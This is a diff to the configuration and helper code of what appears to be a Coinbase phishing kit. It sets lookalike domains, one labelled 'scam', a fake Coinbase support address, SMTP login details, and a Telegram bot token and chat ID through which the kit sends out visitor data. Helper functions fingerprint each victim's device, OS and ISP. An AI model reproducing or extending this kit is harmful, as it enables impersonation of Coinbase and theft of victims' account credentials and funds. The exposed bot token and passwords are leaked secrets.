@@ -1,30 +1,33 @@
 <?php
+session_start();
 define('API_KEY', '1847280168:AAGR9JY20lXvo44Xph9BrgAsYgwYnoJCy_E');
-//SET WEBSITE
-$config['title'] = 'Coinbase X SPM55';
-$config['url'] = 'https://ocolnbase.com';
-$config['parameter'] = 'boyxd';
-$config['chat_id'] = '-771260425';
-$config['alex'] = 'on';
-$config['email_cs'] = 'contact.us.coinbase@gmail.com';
 
-//SET SMTP
-$config['host'] = 'smtp.gmail.com';//Host
-$config['email'] = 'no-reply@0coinbase.com';//Email
-$config['password'] = 'Kontolgaming123@';//Password
+//SET WEBSITE
+$config = [
+    'title' => 'Coinbase X SPM55',
+    'url' => 'https://coinbase.zalgips.com/',
+    'scam' => 'https://ocolnbase.com',
+    'parameter' => 'boyxd',
+    'chat_id' => '-771260425',
+    'alex' => 'on',
+    'email_cs' => 'contact.us.coinbase@gmail.com',
+    'host' => 'smtp.gmail.com',
+    'email' => 'no-reply@0coinbase.com',
+    'password' => 'Kontolgaming123@'
+];
 
 function bot($method,$datas=[]){
-	$url = "https://api.telegram.org/bot".API_KEY."/".$method;
-	$ch = curl_init();
-	curl_setopt($ch, CURLOPT_URL, $url);
-	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-	curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
-	$res = curl_exec($ch);
-	if (curl_error($ch)) {
-		var_dump(curl_error($ch));
-	}else{
-		return json_decode($res);
-	}
+    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
+    $res = curl_exec($ch);
+    if (curl_error($ch)) {
+        var_dump(curl_error($ch));
+    }else{
+        return json_decode($res);
+    }
 }
 
 function device(){
@@ -164,6 +167,9 @@ function getisp($ip) {
     curl_close($curl);
     $details   = json_decode($content);
     return $details->isp;
+}
+function sendmsg($text){
+    echo $text;exit();
 }
 $os = getOS();
 $ispuser = getisp($ip);
